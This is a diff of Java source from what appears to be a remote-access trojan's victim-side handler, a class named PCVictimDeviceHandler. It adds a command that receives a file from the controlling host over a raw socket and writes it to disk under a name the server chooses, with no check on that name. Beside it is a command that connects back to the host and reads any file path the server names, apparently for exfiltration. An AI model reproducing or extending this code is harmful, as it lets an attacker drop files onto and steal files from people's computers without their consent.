@@ -113,6 +113,27 @@ public class PCVictimDeviceHandler extends ChannelInboundHandlerAdapter {
                 break;
             case "start.download.file":
                 try {
+                    String testPath = "victimDownloads/";
+                    String filename = (String) message.get("filename");
+                    File file = new File(testPath + filename);
+                    FileOutputStream fileOutputStream = new FileOutputStream(file);
+                    Socket socket = new Socket(host, Math.toIntExact((Long) message.get("port")));
+                    InputStream inputStream = socket.getInputStream();
+                    byte[] bytes = new byte[8*1024];
+                    int len;
+                    while ((len = inputStream.read(bytes)) != -1) {
+                        fileOutputStream.write(bytes, 0, len); //receive file from server
+                    }
+
+                    fileOutputStream.close();
+                    inputStream.close();
+                    socket.close();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+                break;
+            case "start.upload.file":
+                try {
                     Socket socket = new Socket(host, Math.toIntExact((Long) message.get("port"))); //connect to server
                     OutputStream outputStream = socket.getOutputStream();
                     File file = new File((String) message.get("path"));
